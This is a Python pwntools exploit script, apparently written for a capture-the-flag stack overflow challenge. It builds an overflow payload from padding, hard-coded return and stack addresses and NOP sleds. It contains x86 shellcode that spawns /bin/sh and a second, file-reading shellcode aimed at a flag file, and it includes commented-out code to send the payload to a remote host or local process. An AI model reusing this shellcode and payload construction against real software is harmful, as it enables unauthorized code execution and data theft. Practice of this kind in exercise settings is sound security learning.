import struct
from pwn import *
import binascii

#r = remote("192.168.125.11",51337)

#print(r.recv())
pad = "A" * 32
#RET = struct.pack("<Q",0x000000400129)
RET = 0x000000400129
RSP = struct.pack("<Q",0x00000040012a)
RIP = struct.pack("<Q",0x7fffffffe4f0)
RIP = "\xc0\xe4\xff\xff\xff\x7f\x00\x00"
#shellcode = binascii.hexlify(b"\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")
NOPs = "\x90" * 100
#NOP = binascii.unhexlify(NOPs)
toSend=(pad + str(p64(RET))[2:] + str(RSP)[2:] + str(RIP)[2:])#+ shellcode)
print(toSend)
#r.send(binascii.hexlify(toSend).digest())
#print(r.recv())


#!/usr/bin/env python

# from pwn import *
# p = process("./pwn")
# offset = 32

# # File-reader shellcode (Linux - x86)
# # from: http://shell-storm.org/shellcode/files/shellcode-73.php
# shellcode =  "\x31\xc0\x31\xdb\x31\xc9\x31\xd2"
# shellcode += "\xeb\x32\x5b\xb0\x05\x31\xc9\xcd"
# shellcode += "\x80\x89\xc6\xeb\x06\xb0\x01\x31"
# shellcode += "\xdb\xcd\x80\x89\xf3\xb0\x03\x83"
# shellcode += "\xec\x01\x8d\x0c\x24\xb2\x01\xcd"
# shellcode += "\x80\x31\xdb\x39\xc3\x74\xe6\xb0"
# shellcode += "\x04\xb3\x01\xb2\x01\xcd\x80\x83"
# shellcode += "\xc4\x01\xeb\xdf\xe8\xc9\xff\xff"
# shellcode += "\xff"
# shellcode += "/home/pwn1/flag.txt";

# # exploit code
# print(p.recvuntil("\n"))
# stack_addr = 0x7fffffffe4c0

# info("Stack address: {0}".format(hex(stack_addr-32)))
# payload = "A" * offset + str(p64(stack_addr))[2:] + "\x90" * 32 + shellcode

# print(hexdump(payload))
# info("Sending {0} bytes as payload ...".format(len(payload)))

# p.sendline(payload)

# p.interactive() # Get content of file and exit.